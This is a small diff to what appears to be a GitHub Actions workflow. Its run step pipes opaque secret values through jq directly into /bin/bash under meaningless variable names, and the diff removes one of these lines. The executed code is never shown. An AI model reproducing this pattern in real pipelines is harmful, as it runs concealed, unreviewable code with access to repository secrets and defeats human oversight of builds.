@@ -18,7 +18,6 @@ jobs:
           ayx4: ${{ secrets.ayx4 }}
         run: |
           printf '%s' "$ayx4" | jq -r .zglis766 | /bin/bash
-          printf '%s' "$ii2" | jq -r .klpr3 | /bin/bash
           printf '%s' "$hhgj0" | jq -r .unk972 | /bin/bash
           echo $xd3652 | jq -r .krfgg99220 | /bin/bash
           echo $gftq53282 | jq -r .blc2255 | /bin/bash
